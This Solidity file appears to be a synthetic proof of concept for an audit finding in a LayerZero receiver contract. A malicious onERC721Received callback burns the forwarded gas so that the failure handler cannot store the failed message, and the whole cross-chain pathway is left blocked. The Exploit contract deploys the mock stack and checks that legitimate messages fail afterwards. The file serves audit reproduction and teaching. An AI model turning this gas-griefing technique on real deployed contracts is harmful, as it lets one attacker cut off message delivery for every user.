// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/* StationX LayerZeroImpl — users can break the pathway (Pashov H-03, AuditVault 41387).
   SYNTHETIC, cheatcode-free. Root cause: _blockingLzReceive forwards gasleft() into
   nonblockingLzReceive. A safeMint callback that burns the stipend leaves only 1/64
   gas (EIP-150). That is not enough for the cold SSTORE in _storeFailedMessage, so
   the revert reaches the endpoint and the source pathway is blocked. */

interface IReceiver {
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4);
}

contract DaoToken {
    mapping(address => uint256) public balanceOf;
    uint256 public nextId = 1;

    function safeMint(address to) external returns (uint256 id) {
        id = nextId++;
        balanceOf[to] += 1;
        if (to.code.length > 0) {
            IReceiver(to).onERC721Received(msg.sender, address(0), id, "");
        }
    }
}

contract LayerZeroImpl {
    DaoToken public dao;
    uint256 public failedStored;

    constructor(DaoToken _dao) {
        dao = _dao;
    }

    function lzReceive(address buyer) external {
        _blockingLzReceive(buyer);
    }

    function _blockingLzReceive(address buyer) internal {
        (bool success,) = address(this).call{gas: gasleft()}(
            abi.encodeWithSelector(this.nonblockingLzReceive.selector, buyer)
        ); // @> VULN: gasleft() leaves only 1/64 gas if the callee burns its stipend, so the failure store cannot SSTORE

        if (!success) {
            _storeFailedMessage();
        }
    }

    function nonblockingLzReceive(address buyer) external {
        require(msg.sender == address(this), "only self");
        if (buyer.code.length > 0) {
            (bool ok,) = buyer.call(
                abi.encodeWithSignature(
                    "onERC721Received(address,address,uint256,bytes)", address(this), address(0), uint256(1), bytes("")
                )
            );
            if (!ok) {
                // The hook already failed. Burn the rest of this stipend so the caller,
                // which forwarded gasleft(), is left with only the EIP-150 1/64.
                while (true) {
                    assembly {
                        pop(keccak256(0x00, 0x20))
                    }
                }
            }
        }
        dao.safeMint(buyer);
    }

    function _storeFailedMessage() internal {
        failedStored += 1;
    }
}

contract Endpoint {
    LayerZeroImpl public ua;
    bool public blocked;
    uint256 public delivered;

    constructor(LayerZeroImpl _ua) {
        ua = _ua;
    }

    function deliver(address buyer) external {
        if (blocked) revert("pathway blocked");
        // Production LayerZeroImpl asks for 600000 gas. This sample forwards 80000,
        // which is still large enough that EIP-150 leaves only ~1250 gas after a full burn,
        // below a cold SSTORE, while keeping the trace small enough to replay.
        try ua.lzReceive{gas: 80000}(buyer) {
            delivered += 1;
        } catch {
            blocked = true;
        }
    }
}

contract Bob {
    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        revert("burn stipend");
    }
}

contract Exploit {
    DaoToken public dao; // nonce 1
    LayerZeroImpl public lz; // nonce 2
    Endpoint public endpoint; // nonce 3
    Bob public bob; // nonce 4
    address public constant LEGIT = 0x0000000000000000000000000000000000000B0b;
    bool public legitBlocked;
    uint256 public legitBalance;

    constructor() {
        dao = new DaoToken();
        lz = new LayerZeroImpl(dao);
        endpoint = new Endpoint(lz);
        bob = new Bob();
    }

    function run() external {
        (bool firstOk,) = address(endpoint).call{gas: 250000}(
            abi.encodeWithSelector(endpoint.deliver.selector, address(bob))
        );
        require(firstOk, "endpoint ran out of gas");
        require(endpoint.blocked(), "pathway not blocked");
        require(dao.balanceOf(address(bob)) == 0, "bob was minted");
        require(lz.failedStored() == 0, "ua stored the failure");
        try endpoint.deliver(LEGIT) {
            legitBlocked = false;
        } catch {
            legitBlocked = true;
        }
        legitBalance = dao.balanceOf(LEGIT);
        require(legitBlocked, "legit message delivered");
        require(legitBalance == 0, "legit user minted");
        require(endpoint.delivered() == 0, "a message landed");
    }
}
